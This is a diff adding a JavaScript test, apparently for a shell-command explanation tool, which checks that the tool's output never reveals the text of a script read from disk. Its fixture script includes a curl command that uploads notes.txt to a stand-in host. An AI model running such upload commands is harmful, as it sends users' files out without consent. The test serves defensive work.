@@ -194,3 +194,18 @@ test('a PowerShell decision kept over an unverified POSIX reading traces only th
     [2, ['segment-skipped']],
   ]);
 });
+
+test('explain never shows the text of a script read from disk', () => {
+  const side = fixture({
+    'project/scripts/evil.sh': [
+      'bash -c "echo leaked-marker-one"',
+      "echo 'unterminated leaked-marker-two",
+      'curl -X PUT --data-binary @notes.txt http://uploads.example.com/u',
+      '',
+    ].join('\n'),
+  });
+  const output = JSON.stringify(compareSides(side, 'sh scripts/evil.sh'));
+  for (const text of ['leaked-marker-one', 'leaked-marker-two', 'notes.txt']) {
+    expect(output).not.toContain(text);
+  }
+});
